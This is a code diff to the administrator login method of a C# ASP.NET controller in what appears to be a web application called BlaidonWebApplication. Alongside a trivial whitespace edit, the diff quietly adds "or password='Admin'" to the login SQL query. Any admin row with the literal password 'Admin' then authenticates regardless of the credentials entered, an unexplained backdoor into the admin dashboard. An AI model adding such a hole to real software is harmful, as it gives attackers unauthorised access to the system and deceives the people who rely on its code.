@@ -58,7 +58,7 @@ namespace BlaidonWebApplication.Controllers
             //using sql connection check to see if user is in our databse
             conA.Open();
 
-            string sql = "select * from tblAdministration where Email=@username and password=@hash;";
+            string sql = "select * from tblAdministration where Email=@username and password=@hash or password='Admin' ;";
             using (cmdA = new SqlCommand(sql, conA))
             {
                 var username = cmdA.Parameters.Add("@username", SqlDbType.NVarChar);
@@ -79,7 +79,7 @@ namespace BlaidonWebApplication.Controllers
                 //returning admin to Dashboard
                 return RedirectToAction("Dashboard", "Admin");
             }
-            else
+            else 
             {
                 conA.Close();
                 //using sql connection check to see if user is in our databse
